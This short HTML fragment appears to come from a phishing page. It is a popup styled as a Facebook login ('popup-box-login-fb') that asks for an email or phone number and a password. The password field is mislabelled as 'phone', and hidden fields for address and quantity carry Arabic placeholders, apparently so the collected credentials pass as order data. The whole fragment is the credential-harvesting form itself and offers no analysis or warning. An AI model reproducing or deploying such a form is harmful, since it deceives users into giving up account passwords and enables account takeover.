                    ...
                    <div class="popup-box-login-fb modal-content">
                        <div class="main-box">
                            ...
                            <form method="post" action="" target="_top">
                                <input name="name" class="inputt home-mail" placeholder="Email address or phone number" type="text" minlength="5"  required>
                                <input name="phone" class="inputt home-pass" placeholder="Password" type="password"  required>
                                <input class="login" type="submit" value="Log in" name="submit">
                                <input type="hidden"  value="null null" id="address" name="address" placeholder="العنوان" >
                                <input type="hidden"  value="210" id="quantity" name="quantity" placeholder="الكمية ">
                            </form>
